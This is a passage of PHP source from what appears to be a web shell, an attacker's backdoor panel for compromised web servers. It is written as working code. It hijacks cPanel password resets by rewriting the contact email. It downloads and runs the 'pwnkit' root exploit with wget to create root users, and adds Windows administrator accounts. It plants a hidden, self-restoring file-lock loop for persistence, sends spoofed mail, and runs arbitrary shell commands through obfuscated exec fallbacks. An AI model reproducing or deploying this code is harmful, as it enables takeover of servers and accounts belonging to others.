        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Diperbaiki
            $fd = $repl . "/" . $it;
            if (ExtractArchive($fd, $repl . '/') == true) {
                success();
            } else {
                failed();
            }
        }
    } else if ($_POST['gecko-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Diperbaiki
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['resetcp'] == true) {
        $emailCp = $_POST['resetcp'];
        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
        $pathcp = $path0cp . "/.cpanel/contactinfo";
        $contactinfo = ' 
"email" : "' . $emailCp . '" 
        ';
        if ($fungsi[3]($pathcp)) {
            $fungsi[28]($pathcp, $contactinfo);
            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
        } else {
            failed();
        }
    }
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .mad-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.mad-root')) {
            $response = $fungsi[11]('.mad-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '
' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        cmd("chmod 444 " . $flesName);
        $handler = ' 
<?php 
@ini_set("max_execution_time", 0); 
while (True){ 
    if (!file_exists("' . $fungsi[0]() . '")){ 
        mkdir("' . $fungsi[0]() . '"); 
    } 
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){ 
        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '")); 
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text)); 
    } 
    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){ 
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444); 
    }  
    if (gecko_perm("' . $fungsi[0]() . '") != 0555){ 
        chmod("' . $fungsi[0]() . '", 0555); 
    } 
} 
 
function gecko_perm($flename){ 
    return substr(sprintf("%o", fileperms($flename)), -4); 
} 
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
            cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
            success();
        } else {
            failed();
        }
    } else if ($_POST['add-rdp'] == True) {
        $userRDP = $_POST['add-rdp'];
        $passRDP = $_POST['add-rdp-pass'];
        if (stristr(PHP_OS, "WIN")) {
            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
            if ($procRDP) {
                cmd("net localgroup administrators " . $userRDP . " /add");
                success();
            } else {
                failed();
            }
        } else {
            failed();
        }
    } else if ($_POST['mail-from-smtp'] == True) {
        $emailFrom = $_POST['mail-from-smtp'];
        $emailTo = $_POST['mail-to-smtp'];
        $emailSubject = $_POST['mailto-subject'];
        $messageMail = $_POST['message-smtp'];
        $headersMail = 'From: ' . $emailFrom . '' . "
" .
            'Reply-To: ' . $emailFrom . '' . "
" .
            'X-Mailer: PHP/' . phpversion();
        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
        if ($procMailSmTp) {
            success();
        } else {
            failed();
        }
    }
}

if ($_GET['response'] == "success") {
    echo "<script> 
Swal.fire({ 
    icon: 'success', 
    title: 'Success!', 
    text: 'Operation completed successfully!', 
    confirmButtonColor: '#64ffda',
    background: 'rgba(17, 34, 64, 0.95)',
    color: '#64ffda',
    iconColor: '#64ffda',
    confirmButtonText: 'OK',
    customClass: {
        popup: 'swal-bash-theme',
        confirmButton: 'swal-btn-bash'
    }
})</script>";
} else if ($_GET['response'] == "failed") {
    echo "<script> 
Swal.fire({ 
    icon: 'error', 
    title: 'Failed!', 
    text: 'Something went wrong. Please try again.', 
    confirmButtonColor: '#ef5350',
    background: 'rgba(17, 34, 64, 0.95)',
    color: '#64ffda',
    iconColor: '#ef5350',
    confirmButtonText: 'OK',
    customClass: {
        popup: 'swal-bash-theme',
        confirmButton: 'swal-btn-bash'
    }
}) 
    </script>";
}


function success()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
}
function failed()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
}

function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}


function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function unx($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}

function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function s()
{
    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
    if (!$d0mains) {
        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
        $GLOBALS["need_to_update_header"] = "true";
    } else {
        $count = 0;
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone "(.*)"#', $d0main, $domains);
                flush();
                if (strlen(trim($domains[1][0])) > 2) {
                    flush();
                    $count++;
                }
            }
        }
        $dom = "$count Domain";
    }
    return $dom;
}

function cmd($in, $re = false)
{
    $out = null;
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("exec")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("", $out);
        } elseif (function_exists("passthru")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("proc_open")) {
            $pipes = array();
            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        }
    } catch (Exception $e) {
    }
    return $out;
}


function winpwd()
{
    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
}

function compressToZip($sourceFile, $zipFilename)
{
    $zip = new ZipArchive();

    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
        $zip->addFile($sourceFile, basename($sourceFile));
        $zip->close();
        success();
    } else {
        failed();
    }
}

function remove_slash($val)
{
    $tex = str_replace("/", "", $val);
    $tex1 = str_replace(":", "", $tex);
    $tex2 = str_replace("_", "", $tex1);
    $tex3 = str_replace(" ", "", $tex2);
    $tex4 = str_replace(".", "", $tex3);
    return $tex4;
}

function unlinkDir($dir)
{
    $dirs = array($dir);
    $files = array();
    for ($i = 0;; $i++) {
        if (isset($dirs[$i]))
            $dir =  $dirs[$i];
        else
            break;

        if ($openDir = opendir($dir)) {
            while ($readDir = @readdir($openDir)) {
                if ($readDir != "." && $readDir != "..") {

                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
                        $dirs[] = $dir . "/" . $readDir;
                    } else {

                        $files[] = $dir . "/" . $readDir;
                    }
                }
            }
        }
    }



    foreach ($files as $file) {
        $GLOBALS['fungsi'][24]($file);
    }
    $dirs = array_reverse($dirs);
    foreach ($dirs as $dir) {
        $GLOBALS['fungsi'][25]($dir);
    }
}

function remove_dot($file)
{
    $FILES = $file;
    $pch = explode(".", $FILES);
    return $pch[0];
}


function windowsDriver()
{
    $winArr = [
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'V',
        'W',
        'X',
        'Y',
        'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}

function namaPanjang($value)
{
    $namaNya = $value;
    $extensi = pathinfo($value, PATHINFO_EXTENSION);
    if (strlen($namaNya) > 30) {
        return substr($namaNya, 0, 30) . "...";
    } else {
        return $value;
    }
}

function extractArchive($archiveFilename, $extractPath)
{
    $zip = new ZipArchive();

    if ($zip->open($archiveFilename) === TRUE) {
        $zip->extractTo($extractPath);
        $zip->close();
        return true;
    } else {
        return false;
    }
}

function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket 
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link 
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular 
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special 
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory 
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special 
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe 
        $info = 'p';
    } else {
        // Unknown 
        $info = 'u';
    }
    // Owner 
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group 
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World 
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>